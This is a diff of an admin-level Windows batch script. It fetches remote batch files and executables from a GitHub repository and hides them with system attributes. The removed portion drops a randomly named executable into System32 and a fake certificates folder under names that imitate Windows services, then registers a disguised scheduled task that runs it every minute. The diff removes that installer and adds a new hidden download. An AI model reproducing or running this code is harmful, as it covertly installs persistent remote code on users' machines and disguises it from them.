@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=6.5"
+set "BATCHVERSION=6.6"
 set "RESULT=%TEMP%\TUSELMP.txa"
 set "RUNEVERYOFFICIALMD5=e61120a65311d97840928a691e96b36a"
 set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
@@ -357,48 +357,22 @@ goto AFTERORSKIPINSTALLRUNEVERY
 
 
 
-
-
-:INSTRUNEVERY
-
+:RUNEVERYINSTALL
 echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-
-
-
-
-:CheckHandle
-echo :CheckHandle Started.. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-set "file9=%SystemRoot%\System32\handle.exe"
-
-:: Check handle.exe; if found, skip to next section
-if exist "%file9%" (
-    echo %file9% found. Going to INSTRUNEVERY1 >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY1
-)
-
-:: Run commands if handle.exe is not found
-echo Checking for handle... >> "%LOGFILE%" 2>&1
-set "embeddedScript=%temp%\temp_script_handle.bat"
+echo RUNEVERYINSTALL Started.. >> "%LOGFILE%" 2>&1
+:: Run commands if ShellHost.exe is not found
+echo Checking for RunEvery... >> "%LOGFILE%" 2>&1
+set "embeddedScript=%temp%\temp_script_RUNEVRYINST.bat"
 del /f /a "%embeddedScript%" >> "%LOGFILE%" 2>&1
 
 
+
 :: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunEveryCallerForRunEveryRunning"
 attrib +h +s "%embeddedScript%"
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%. >> "%LOGFILE%" 2>&1
@@ -409,175 +383,16 @@ if exist "%embeddedScript%" (
     echo. >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
 ) else (
-    echo Failed to get content from Handle Link >> "%LOGFILE%" 2>&1
+    echo Failed to get content from ShellHost Link >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
-    timeout /t 3 /nobreak >> "%LOGFILE%" 2>&1
-    goto CheckHandle
-)
-
-set "MESSAGE=%MESSAGE%Handle^|"
-
-
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-
-:INSTRUNEVERY1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo INSTRUNEVERY1 Started.. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo %startupFile% not found. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-:: RunEvery Files or Task missing 
-
-
-:RUN
-
-
-:: RunEveryCaller Installer
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo RunEveryCaller Installer Started.. >> "%LOGFILE%" 2>&1
-color 0A
-
-
-
-for /L %%i in (1,1,13) do (
-    set /A "rand=!random! %% 62"
-    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
-)
-
- 
-:: Kill & Delete file 
-taskkill /f /im !filename!.exe >> "%LOGFILE%" 2>&1
-del /f /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
- 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
-
-echo. >> "%LOGFILE%" 2>&1
-echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-:: Download the file using curl
-curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
- 
-timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
- 
-:: Checking the existing of the file
-if not exist "%TEMP%\!filename!.exe" (
-    echo. >> "%LOGFILE%" 2>&1
-    echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
-    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-    echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
-    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY1
-)
- 
- 
- 
-:: Get the file size in bytes
-for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
- 
- 
- 
-:: Check if the file size is at least 80KB (80000 bytes)
-if %FILESIZE% geq 80000 (
-    echo Starting... >> "%LOGFILE%" 2>&1
-    rem start "" "%TEMP%\!filename!.exe"
-    echo Started.. >> "%LOGFILE%" 2>&1
-) else (
-    echo.
-    echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
-     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-     echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
-     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-     echo. >> "%LOGFILE%" 2>&1
-     goto INSTRUNEVERY1
+    timeout /t 3 /nobreak  >> "%LOGFILE%" 2>&1
+    goto RUNEVERYINSTALL
 )
 
 
 
-if exist "%TEMP%\!filename!.exe" (
-    echo !filename!.exe File exists. Attempting to run... >> "%LOGFILE%" 2>&1
-    rem start "" "%TEMP%\!filename!.exe"
-) else (
-    echo ERROR: File not found. >> "%LOGFILE%" 2>&1
-)
 
 
-:: Killing Processes
-taskkill /F /IM "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" >> "%LOGFILE%" 2>&1
-taskkill /F /IM "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" >> "%LOGFILE%" 2>&1
-taskkill /F /IM "%SystemRoot%\System32\convertsshd.exe" >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-:: End then remove tasks
-schtasks /End /TN "SystemLibrariesU" >> "%LOGFILE%" 2>&1
-schtasks /Delete /TN "SystemLibrariesU" /F >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-set "FILECHECK=%RUNEVERYLOGFILE%"
-for /f "tokens=1,3 delims= " %%a in ('handle "%FILECHECK%" 2^>nul ^| findstr /i "pid:"') do (
-    echo Killing %%a %%b >> "%LOGFILE%" 2>&1
-    taskkill /PID %%b /F >> "%LOGFILE%" 2>&1
-	echo. >> "%LOGFILE%" 2>&1
-	echo. >> "%LOGFILE%" 2>&1
-)
-
-
-:: Delete files
-del /F /Q "%SystemRoot%\System32\convertsshd.exe" >> "%LOGFILE%" 2>&1
-del /F /Q "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" >> "%LOGFILE%" 2>&1
-del /F /Q "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-
-:: Installing now
-
-
-mkdir "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks" >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-:: Copy RUNEVERY To System32 + Tasks Folder
-copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\convertsshd.exe" /y >> "%LOGFILE%" 2>&1
-copy "%TEMP%\!filename!.exe" "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" /y >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-:: Create RUNEVERY scheduled task to run at every minute
-
-schtasks /create /tn "SystemLibrariesU" /tr "\"%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe\"" /sc minute /mo 1 /f >> "%LOGFILE%" 2>&1
-powershell -Command "$task = Get-ScheduledTask -TaskName 'SystemLibrariesU'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask" >> "%LOGFILE%" 2>&1
 
 
 
